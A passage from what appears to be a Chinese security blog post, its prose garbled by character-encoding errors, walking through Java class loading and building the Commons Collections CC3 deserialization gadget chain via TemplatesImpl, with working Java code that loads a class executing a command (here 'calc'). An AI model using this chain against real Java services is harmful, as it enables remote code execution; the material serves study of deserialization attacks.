ClassNotFoundException &#123;</span><br><span class="line">        ClassLoader c1=ClassLoader.getSystemClassLoader();</span><br><span class="line">        Class.forName(<span class="string">&quot;org.example.Person&quot;</span>,<span class="literal">false</span>,c1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240510223610815.png" alt="image-20240510223610815"></p><p>å®ä¾‹åŒ–:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">          <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240510222941281.png" alt="image-20240510222941281"></p><h2 id="åŒäº²å§”æ´¾æœºåˆ¶"><a href="#åŒäº²å§”æ´¾æœºåˆ¶" class="headerlink" title="åŒäº²å§”æ´¾æœºåˆ¶"></a>åŒäº²å§”æ´¾æœºåˆ¶</h2><blockquote><p>æ‰€è°“çš„åŒäº²å§”æ´¾æœºåˆ¶ï¼ŒæŒ‡çš„å°±æ˜¯ï¼š<strong>å½“ä¸€ä¸ªç±»åŠ è½½å™¨æ”¶åˆ°äº†ç±»åŠ è½½çš„è¯·æ±‚çš„æ—¶å€™ï¼Œä»–ä¸ä¼šç›´æ¥å»åŠ è½½æŒ‡å®šçš„ç±»ï¼Œè€Œæ˜¯æŠŠè¿™ä¸ªè¯·æ±‚å§”æ‰˜ç»™è‡ªå·±çš„çˆ¶åŠ è½½å™¨å»åŠ è½½ã€‚åªæœ‰çˆ¶åŠ è½½å™¨æ— æ³•åŠ è½½è¿™ä¸ªç±»çš„æ—¶å€™ï¼Œæ‰ä¼šç”±å½“å‰è¿™ä¸ªåŠ è½½å™¨æ¥è´Ÿè´£ç±»çš„åŠ è½½ã€‚</strong><br>é‚£ä¹ˆï¼Œä»€ä¹ˆæƒ…å†µä¸‹çˆ¶åŠ è½½å™¨ä¼šæ— æ³•åŠ è½½æŸä¸€ä¸ªç±»å‘¢ï¼Ÿ<br>å…¶å®ï¼ŒJavaä¸­æä¾›çš„è¿™å››ç§ç±»å‹çš„åŠ è½½å™¨ï¼Œæ˜¯æœ‰å„è‡ªçš„èŒè´£çš„ï¼š</p><ul><li>Bootstrap ClassLoader ï¼Œä¸»è¦è´Ÿè´£åŠ è½½Javaæ ¸å¿ƒç±»åº“ï¼Œ%JRE_HOME%\libä¸‹çš„rt.jarã€resources.jarã€charsets.jarå’Œclassç­‰ã€‚</li><li>Extention ClassLoaderï¼Œä¸»è¦è´Ÿè´£åŠ è½½ç›®å½•%JRE_HOME%\lib\extç›®å½•ä¸‹çš„jaråŒ…å’Œclassæ–‡ä»¶ã€‚</li><li>Application ClassLoader ï¼Œä¸»è¦è´Ÿè´£åŠ è½½å½“å‰åº”ç”¨çš„classpathä¸‹çš„æ‰€æœ‰ç±»</li><li>User ClassLoader ï¼Œ ç”¨æˆ·è‡ªå®šä¹‰çš„ç±»åŠ è½½å™¨,å¯åŠ è½½æŒ‡å®šè·¯å¾„çš„classæ–‡ä»¶</li></ul></blockquote><h2 id="URLclassLoaderä»»æ„ç±»åŠ è½½"><a href="#URLclassLoaderä»»æ„ç±»åŠ è½½" class="headerlink" title="URLclassLoaderä»»æ„ç±»åŠ è½½"></a>URLclassLoaderä»»æ„ç±»åŠ è½½</h2><p>è¿™ä¸ªç±»é‡Œé¢è¿˜æœ‰ä¸€ä¸ªloadclassæ–¹æ³•ï¼Œå¯ä»¥é€šè¿‡URLåŠ è½½ç±»</p><h2 id="ClassLoaderåŠ è½½å­—èŠ‚ç æ‰§è¡Œå‘½ä»¤"><a href="#ClassLoaderåŠ è½½å­—èŠ‚ç æ‰§è¡Œå‘½ä»¤" class="headerlink" title="ClassLoaderåŠ è½½å­—èŠ‚ç æ‰§è¡Œå‘½ä»¤"></a>ClassLoaderåŠ è½½å­—èŠ‚ç æ‰§è¡Œå‘½ä»¤</h2><p>é€šè¿‡è·Ÿè¿›è°ƒè¯•åŒäº²å§”æ´¾æœºåˆ¶, æˆ‘ä»¬å‘ç°æœ€ç»ˆæ˜¯<code>Classloader.defineClass</code>åŠ è½½å­—èŠ‚ç æ¥åŠ è½½ç±», é‚£ä¹ˆ, å°±å¯ä»¥åå°„è·å–<code>defineClass</code>æ¥ç›´æ¥åŠ è½½ä»»æ„ç±»</p><p>ç”Ÿæˆç›®æ ‡ç±»å­—èŠ‚ç æ–‡ä»¶:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åå°„åŠ è½½ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, IOException, InvocationTargetException, IllegalAccessException, InstantiationException &#123;</span><br><span class="line">        Method defineclass=ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        defineclass.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] words = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Code\\Java-code\\CC1\\target\\classes\\org\\example\\Hello.class&quot;</span>));</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">c</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">hello</span> <span class="operator">=</span> (Class) defineclass.invoke(c, <span class="string">&quot;org.example.Hello&quot;</span>, words, <span class="number">0</span>, words.length);</span><br><span class="line">        hello.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240511204156647.png" alt="image-20240511204156647"></p><h2 id="UnsafeåŠ è½½å­—èŠ‚ç "><a href="#UnsafeåŠ è½½å­—èŠ‚ç " class="headerlink" title="UnsafeåŠ è½½å­—èŠ‚ç "></a>UnsafeåŠ è½½å­—èŠ‚ç </h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, IllegalAccessException, InstantiationException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">byte</span>[] words = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Code\\Java-code\\CC1\\target\\classes\\org\\example\\Hello.class&quot;</span>));</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">c</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) f.get(<span class="literal">null</span>);</span><br><span class="line">        Class&lt;?&gt; hello = unsafe.defineClass(<span class="string">&quot;org.example.Hello&quot;</span>, words, <span class="number">0</span>, words.length, c, <span class="literal">null</span>);</span><br><span class="line">        hello.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ¬¡æˆ‘è·å–çš„æ˜¯unsafeçš„å±æ€§ï¼Œè€Œä¸æ˜¯<code>defineClass</code>æ–¹æ³•ï¼ŒåŒæ ·çš„unsafeç±»ä¹Ÿæœ‰definclassæ–¹æ³•ï¼Œä½†æ˜¯ä»–æ˜¯åŸç”Ÿçš„ç±»ï¼ˆåº•å±‚CåŠ è½½ï¼‰ï¼Œå› æ­¤åå°„è¿‡æ¥æ— æ³•è°ƒç”¨, å› æ­¤æˆ‘ä»¬éœ€è¦å…ˆè·å–Unsafeå¯¹è±¡ï¼Œè¿›è€Œè°ƒç”¨definclassæ–¹æ³•ï¼Œæœ€ååŠ è½½ä»»æ„ç±»ä»è€Œå®ç°å‘½ä»¤æ‰§è¡Œ</p><h2 id="é“¾å­åˆ†æ-2"><a href="#é“¾å­åˆ†æ-2" class="headerlink" title="é“¾å­åˆ†æ"></a>é“¾å­åˆ†æ</h2><p>CC3é‡‡ç”¨çš„æ˜¯åŠ¨æ€åŠ è½½ç±»ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢è®²åŸºç¡€æ—¶ç”¨åˆ°è¿‡çš„<code>ClassLoder.defineclass</code>,å› æ­¤æˆ‘ä»¬å¯»æ‰¾è°è°ƒç”¨äº†defineclassæ–¹æ³•</p><p>åœ¨javaæ ¸å¿ƒåº“ä¸­, åœ¨com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.TransletClassLoaderé‡Œè°ƒç”¨äº†:</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240511222124553.png" alt="image-20240511222124553"></p><p>ç»§ç»­è·Ÿè¿›, çœ‹çœ‹è¯¥ç±»çš„å“ªé‡Œè°ƒç”¨äº†defineclass</p><p>åœ¨<code>defineTransletClasses</code>ä¸­</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240511222341863.png" alt="image-20240511222341863"></p><p>å¯ä»¥çœ‹è§è¿™é‡Œæœ‰è°ƒç”¨, ä½†æ˜¯å¿…é¡»ç»•è¿‡ç¬¬ä¸€ä¸ªåˆ¤æ–­, æˆ‘ä»¬ç¿»ä¸Šå»çœ‹<code>_bytecodes</code>çš„é»˜è®¤å€¼å°±æ˜¯null, å› æ­¤éœ€è¦åå°„èµ‹å€¼, å¦åˆ™æ˜¯æ— æ³•æ‰§è¡Œåˆ°defineclassçš„</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240511222952049.png" alt="image-20240511222952049"></p><p>è¿™é‡Œè°ƒç”¨<code>_tfactory.getExternalExtensionsMap()</code>, å› æ­¤<code>_tfactory</code>ä¹Ÿä¸èƒ½ä¸ºç©º</p><p>ä¸è¿‡å¥½åœ¨åœ¨readObjectä¸­<code>_tfactory</code>ä¼šè¢«è‡ªåŠ¨èµ‹å€¼, å› æ­¤æˆ‘ä»¬ä¸å¿…å…³å¿ƒ</p><p>ç»§ç»­çœ‹å“ªé‡Œè°ƒç”¨äº†<code>defineTransletClasses</code></p><p>å½“å‰ç±»ä¸­èƒ½å¤Ÿæœç´¢åˆ°ä¸‰å¤„è°ƒç”¨,  æˆ‘ä»¬åªå…³å¿ƒ<code>getTransletInstance</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240511223533379.png" alt="image-20240511223533379"></p><p>è¿™é‡Œçš„ifåˆ¤æ–­ä¾ç„¶æ˜¯éœ€è¦åå°„èµ‹å€¼,</p><p>ç»§ç»­è·Ÿè¿›å“ªé‡Œè°ƒç”¨äº†<code>getTransletInstance</code></p><p>åªæœ‰ä¸€ä¸ª<code>newTransformer</code>å¯¹å…¶è¿›è¡Œäº†è°ƒç”¨</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240511223717794.png" alt="image-20240511223717794"></p><p>è‡³æ­¤, ç°åœ¨çš„æ€è·¯å°±æ˜¯å®ä¾‹åŒ–ä¸€ä¸ª<code>TemplatesImpl</code>,ç„¶åè°ƒç”¨å®ƒçš„<code>newTransformer</code>æ–¹æ³•, ä»¥æ­¤æ¥è¾¾åˆ°åŠ è½½ä»»æ„ç±»çš„ç›®çš„</p><p>ç¼–å†™demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, TransformerConfigurationException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Code\\Java-code\\CC1\\target\\classes\\org\\example\\Hello.class&quot;</span>));</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, bytes);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        templates.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240519195412264.png" alt="image-20240519195412264"></p><p>è¿è¡Œä¼šæŠ¥é”™</p><p>è¿™é‡Œå¤§æ„äº†, åœ¨ç±»ä¸­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">byte</span>[][] _bytecodes = <span class="literal">null</span>;</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªæ˜¯ä¸€ä¸ªäºŒç»´çš„æ•°ç»„</p><p>å› æ­¤æˆ‘ä»¬éœ€è¦æ”¹å†™ä¸€ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Code\\Java-code\\CC1\\target\\classes\\org\\example\\Hello.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240519201358854.png" alt="image-20240519201358854"></p><p>ä¹‹åè¿™é‡Œä»ç„¶ä¼šæŠ¥é”™, æˆ‘ä»¬è·Ÿè¿›è°ƒè¯•ä¸€ä¸‹</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240519202511737.png" alt="image-20240519202511737"></p><p>é—®é¢˜å‡ºåœ¨äº†è¿™é‡Œ, è¿™é‡Œè¿›å…¥äº†419è¡Œ, å°†_transletIndexèµ‹å€¼æˆäº†å°äºä¸€çš„æ•°, å¯¼è‡´è¿›å…¥428è¡ŒæŠ›å‡ºé”™è¯¯</p><p>ä¸ºäº†é¿å…è¿›å…¥419è¡Œ, æˆ‘ä»¬åŠ è½½çš„ç±»å¿…é¡»æ»¡è¶³å…¶ç»§æ‰¿<code>ABSTRACT_TRANSLET</code>è¿™ä¸ªç±», æˆ‘ä»¬ç‚¹è¿›å»å¯ä»¥çœ‹è§</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240519202807342.png" alt="image-20240519202807342"></p><p>å› æ­¤æˆ‘ä»¬åªéœ€è¦æ¶æ„ç»§æ‰¿ä¸€ä¸‹å³å¯</p><p>æˆ‘ä»¬ä¿®æ”¹è¦åŠ è½½çš„ç±»ä¸º:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// ç»§æ‰¿AbstractTransletå¿…é¡»é‡å†™ä»¥ä¸‹æ–¹æ³•</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘å¥½åè¿è¡Œæˆ‘ä»¬çš„demo,</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240519203400370.png" alt="image-20240519203400370"></p><p>è¿™é‡Œä»ç„¶ä¼šçœ‹åˆ°æŠ¥é”™, ä½†æ˜¯å·²ç»æˆåŠŸäº†!</p><p>ä½†æ˜¯ç›®å‰è¿™æ¡é“¾å­ä»ç„¶å—é™äºéœ€è¦newTransformer()çš„è°ƒç”¨è¿™ä¸€å…ˆå†³æ¡ä»¶</p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨CC1çš„é“¾å­æ¥è°ƒç”¨è¿™ä¸ªnewTransformer()æ–¹æ³•,ä»è€Œè§¦å‘ä»»æ„ç±»åŠ è½½</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Code\\Java-code\\CC1\\target\\classes\\org\\example\\Hello.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">       <span class="comment">// templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title 